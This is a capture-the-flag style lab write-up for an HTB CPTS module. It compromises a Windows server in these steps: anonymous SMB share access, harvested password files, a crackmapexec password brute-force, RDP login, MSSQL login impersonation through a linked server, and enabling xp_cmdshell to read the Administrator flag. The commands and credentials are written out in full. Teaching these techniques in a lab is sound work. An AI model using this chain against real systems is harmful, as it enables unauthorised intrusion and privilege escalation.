# Attacking Common Services - Hard

This writeup is for the CPTS path of HTB. The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know. 
The following questions need to be answered:


1. What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)

2. Enumerate the target and find a password for the user Fiona. What is her password?

3. Once logged in, what other user can we compromise to gain admin privileges?

4. Submit the contents of the flag.txt file on the Administrator Desktop.

```
nmap -A -Pn 10.129.203.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-01 12:21 CDT
Nmap scan report for 10.129.203.10
Host is up (0.086s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.203.10:1433: 
|     Target_Name: WIN-HARD
|     NetBIOS_Domain_Name: WIN-HARD
|     NetBIOS_Computer_Name: WIN-HARD
|     DNS_Domain_Name: WIN-HARD
|     DNS_Computer_Name: WIN-HARD
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-09-01T17:23:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-09-01T17:01:04
|_Not valid after:  2055-09-01T17:01:04
| ms-sql-info: 
|   10.129.203.10:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-01T17:23:18+00:00
|_ssl-date: 2025-09-01T17:23:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2025-08-31T17:00:56
|_Not valid after:  2026-03-02T17:00:56
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-01T17:23:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   82.58 ms 10.10.14.1
2   82.98 ms 10.129.203.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.17 seconds
```

There is an smb service running on port 445. List the shares it has using smbclient:

```
smbclient -N -L 10.129.203.10

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.203.10 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

Connect to the Home share and list the directories within it:

```
smbclient -N //10.129.203.10/Home
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 21 16:18:21 2022
  ..                                  D        0  Thu Apr 21 16:18:21 2022
  HR                                  D        0  Thu Apr 21 15:04:39 2022
  IT                                  D        0  Thu Apr 21 15:11:44 2022
  OPS                                 D        0  Thu Apr 21 15:05:10 2022
  Projects                            D        0  Thu Apr 21 15:04:48 2022

		7706623 blocks of size 4096. 3163508 blocks available
```

There are three other directories; Fiona, John, and Simon, and within each directory, there are files to 
bring back to the host machine:

```
smb: \> cd IT
smb: \IT\> ls
  .                                   D        0  Thu Apr 21 15:11:44 2022
  ..                                  D        0  Thu Apr 21 15:11:44 2022
  Fiona                               D        0  Thu Apr 21 15:11:53 2022
  John                                D        0  Thu Apr 21 16:15:09 2022
  Simon                               D        0  Thu Apr 21 16:16:07 2022

		7706623 blocks of size 4096. 3163500 blocks available
smb: \IT\> cd Fiona
smb: \IT\Fiona\> ls
  .                                   D        0  Thu Apr 21 15:11:53 2022
  ..                                  D        0  Thu Apr 21 15:11:53 2022
  creds.txt                           A      118  Thu Apr 21 15:13:11 2022

		7706623 blocks of size 4096. 3163500 blocks available
smb: \IT\Fiona\> get creds.txt
getting file \IT\Fiona\creds.txt of size 118 as creds.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

```
cd ../Simon\
smb: \IT\Simon\> ls
  .                                   D        0  Thu Apr 21 16:16:07 2022
  ..                                  D        0  Thu Apr 21 16:16:07 2022
  random.txt                          A       94  Thu Apr 21 16:16:48 2022

		7706623 blocks of size 4096. 3163436 blocks available
smb: \IT\Simon\> get random.txt
getting file \IT\Simon\random.txt of size 94 as random.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

```
cd ../John\
smb: \IT\John\> ls
  .                                   D        0  Thu Apr 21 16:15:09 2022
  ..                                  D        0  Thu Apr 21 16:15:09 2022
  information.txt                     A      101  Thu Apr 21 16:14:58 2022
  notes.txt                           A      164  Thu Apr 21 16:13:40 2022
  secrets.txt                         A       99  Thu Apr 21 16:15:55 2022

		7706623 blocks of size 4096. 3167781 blocks available
smb: \IT\John\> prompt
smb: \IT\John\> mget *
getting file \IT\John\information.txt of size 101 as information.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
getting file \IT\John\notes.txt of size 164 as notes.txt (0.5 KiloBytes/sec) (average 0.4 KiloBytes/sec)
getting file \IT\John\secrets.txt of size 99 as secrets.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

The files creds.txt, secrets.txt, and random.txt, all seem to contain potential passwords, therefore, combine all of the files into one:

```
cat creds.txt secrets.txt random.txt > passwords.txt
```

Inside the paswords.txt file contains all the passwords: 

```
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!
Password Lists:

1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123

Credentials

(k20ASD10934kadA
KDIlalsa9020$
JT9ads02lasSA@
Kaksd032klasdA#
LKads9kasd0-@
```


Use crackmapexec to bruteforce the password of the user fiona on SMB:

```
sudo cme smb 10.129.203.10 -u fiona -p passwords.txt
SMB         10.129.203.10   445    WIN-HARD         [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-HARD) (domain:WIN-HARD) (signing:False) (SMBv1:False)
SMB         10.129.203.10   445    WIN-HARD         [-] WIN-HARD\fiona:Windows Creds STATUS_LOGON_FAILURE 
SMB         10.129.203.10   445    WIN-HARD         [-] WIN-HARD\fiona: STATUS_LOGON_FAILURE 
SMB         10.129.203.10   445    WIN-HARD         [-] WIN-HARD\fiona:kAkd03SA@#! STATUS_LOGON_FAILURE 
SMB         10.129.203.10   445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl   <-----------------
```

There is the user: Fiona and the password: 48Ns72!bns74@S84NNNSl

Using the attained credentials, connect to spawned target using xfreerdp and then open PowerShell: 

```
xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl'
```

Open Powershell: 
<img width="1064" height="756" alt="image" src="https://github.com/user-attachments/assets/4c2df7c3-b8ba-4e3a-8642-9e71f0401183" />

Connect to the default MSSQL instance by using Windows Authentication mode, providing the name of the computer WIN-HARD for the -S option:

<img width="1069" height="154" alt="image" src="https://github.com/user-attachments/assets/48fb932f-60ba-4a66-b11e-3a039d7e9f9b" />


Identify users that can be impersonated as, john and simon:

cmd:

` SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`

<img width="1073" height="427" alt="image" src="https://github.com/user-attachments/assets/bbbe0e4f-f71e-4cd1-87eb-843b2bfd136a" />

Query for linked servers from the sysservers table, finding one named LOCAL.TEST.LINKED.SRV:

<img width="1078" height="267" alt="image" src="https://github.com/user-attachments/assets/d553c13a-9f1b-472b-8f5f-2fa26cb62454" />

Knowing it's possible to impersonate john, check if john can connect to LOCAL.TEST.LINKED.SRV as a sysadmin:

cmd:
```
1> EXECUTE AS LOGIN = 'john'
2> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]`
3> GO
```
<img width="1265" height="323" alt="image" src="https://github.com/user-attachments/assets/a8bf210f-456c-46f2-b080-5d9470460429" />

john can connect to LOCAL.TEST.LINKED.SRV as the sysadmin user testadmin. 
With john being a sysadmin, enable xp_cmdshell on LOCAL.TEST.LINKED.SRV to commands afterward:

cmd:

```
EXECUTE('EXECUTE sp_configure ''show advanced options'', 1;RECONFIGURE;EXECUTE sp_configure ''xp_cmdshell'', 1;RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
GO
```

<img width="1265" height="95" alt="image" src="https://github.com/user-attachments/assets/fb24ebf8-7817-4761-b9d8-e1d42d20fee7" />

Print out the contents of the flag file "flag.txt":

```
EXECUTE('xp_cmdshell ''more c:\users\administrator\desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
GO
```

<img width="1264" height="200" alt="image" src="https://github.com/user-attachments/assets/8f026236-89e6-43f2-ad9e-9333b4478167" />



















